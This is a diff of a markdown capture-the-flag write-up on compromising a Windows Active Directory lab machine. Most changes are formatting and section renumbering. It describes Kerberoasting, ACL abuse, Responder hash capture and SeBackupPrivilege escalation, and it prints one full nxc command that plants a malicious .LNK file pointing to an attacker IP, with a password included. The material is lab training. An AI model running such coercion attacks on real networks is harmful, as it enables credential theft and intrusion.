@@ -14,7 +14,7 @@ comments: false
 
 Building Magic is an "Easy" difficulty Windows machine that focuses on common Active Directory (AD) attack vectors. The engagement began with the analysis of a leaked database, leading to initial access via **Kerberoasting**. Lateral movement was achieved through **ACL exploitation** (ForceChangePassword) and a **coerced authentication** attack via a malicious `.LNK` file on an SMB share. Final privilege escalation to Domain Admin was accomplished by leveraging the **SeBackupPrivilege** to extract local credentials and identifying administrative password reuse.
 
----
+<hr class="terminal-divider" style="margin-top: 25px;">
 
 ## Tooling Analysis
 
@@ -30,7 +30,7 @@ The following tools were utilized during this engagement:
 | **Responder**                                                        | Exploitation                                     | Poisoning LLMNR/NBT-NS/mDNS requests to capture NetNTLMv2 hashes.                        |
 | **Evil-WinRM**                                                       | Access                                           | Establishing interactive shells over the Windows Remote Management protocol.             |
 
----
+<hr class="terminal-divider" style="margin-top: 25px;">
 
 ## 1. Enumeration & Reconnaissance
 
@@ -57,7 +57,7 @@ The scan confirmed the presence of a Domain Controller running **SMB**, **RPC**,
 
 ![BuildingMagic6.png](/images/BuildingMagic6.png)
 
----
+<hr class="terminal-divider">
 
 ## 2. Initial Access & Lateral Movement
 
@@ -91,7 +91,7 @@ The password for `h.potch` was reset via RPC:
 
 ![BuildingMagic10.png](/images/BuildingMagic10.png)
 
----
+<hr class="terminal-divider">
 
 ## 3. Coerced Authentication & Flag Retrieval
 
@@ -113,7 +113,7 @@ To move laterally, `Responder` was started on the attacker machine:
 
 A malicious `.LNK` file was generated and uploaded to the share using `nxc`:
 
-`nxc smb 10.1.57.200 -u 'h.potch' -p 'NewPassword123!' -M slinky -o NAME=information.lnk SERVER=10.200.30.233 SHARES=File-Share`
+- `nxc smb 10.1.57.200 -u 'h.potch' -p 'NewPassword123!' -M slinky -o NAME=information.lnk SERVER=10.200.30.233 SHARES=File-Share`
 
 ![BuildingMagic15.png](/images/BuildingMagic15.png)
 
@@ -131,9 +131,9 @@ Since `h.grangon` is a member of the **Remote Management Users** group, a WinRM 
 ![BuildingMagic19.png](/images/BuildingMagic19.png)
 ![BuildingMagic20.png](/images/BuildingMagic20.png)
 
----
+<hr class="terminal-divider">
 
-## 5. Privilege Escalation to Domain Admin
+## 4. Privilege Escalation to Domain Admin
 
 ### SeBackupPrivilege Exploitation
 
@@ -158,7 +158,7 @@ A final `evil-winrm` session was established as `a.flatch` (utilizing the local 
 ![BuildingMagic25.png](/images/BuildingMagic25.png)
 ![BuildingMagic26.png](/images/BuildingMagic26.png)
 
----
+<hr class="terminal-divider" style="margin-top: 25px;">
 
 ## Vulnerability Mapping (CWE)
 
@@ -168,7 +168,7 @@ A final `evil-winrm` session was established as `a.flatch` (utilizing the local 
 | **2** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Insecure AD Access Control (ForceChangePassword) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | **CWE-269**: Improper Privilege Management           |
 | **3**                                | Coerced Authentication via SMB                                                  | **CWE-294**: Authentication Bypass by Capture-replay |
 
----
+<hr class="terminal-divider" style="margin-top: 25px;">
 
 ## Remediation & Mitigation Strategies
 
